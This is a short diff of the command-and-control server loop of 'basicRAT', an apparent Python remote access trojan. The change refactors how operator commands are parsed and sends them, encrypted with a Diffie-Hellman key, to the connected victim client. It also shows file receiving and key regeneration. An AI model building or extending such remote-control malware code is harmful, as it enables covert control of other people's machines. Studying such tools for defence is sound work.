@@ -51,18 +51,14 @@ def main():
     #print binascii.hexlify(DHKEY) #debug: confirm DHKEY matches
     
     while True:
-        prompt = raw_input('[{0}] basicRAT> '.format(addr[0])).rstrip().split()
+        prompt = raw_input('[{0}] basicRAT> '.format(addr[0])).rstrip()
 
-        # allow noop
-        if prompt == []:
+        # allow no-op
+        if not prompt: 
             continue
 
         # seperate prompt into command and action
-        cmd, action = prompt[0], ' '.join(prompt[1:])
-
-        # allow no action
-        if action == []:
-            action = ''
+        cmd, _, action = prompt.partition(' ')
 
         # display help text
         if cmd == 'help':
@@ -70,8 +66,7 @@ def main():
             continue
 
         # send data to client
-        data = '{} {}'.format(cmd, action).rstrip()
-        conn.send(encrypt(data, DHKEY))
+        conn.send(encrypt(prompt, DHKEY))
 
         # stop server
         if cmd == 'quit':
@@ -94,7 +89,7 @@ def main():
                         break
                     f.write(decrypt(recv_data, DHKEY))
                     
-        # regenerate DH key (dangerous! may cause connection loss)
+        # regenerate DH key (dangerous! may cause connection loss!)
         # available in case a fallback occurs or you suspect evesdropping
         elif cmd == 'rekey':
             DHKEY = diffiehellman(conn, server=True)
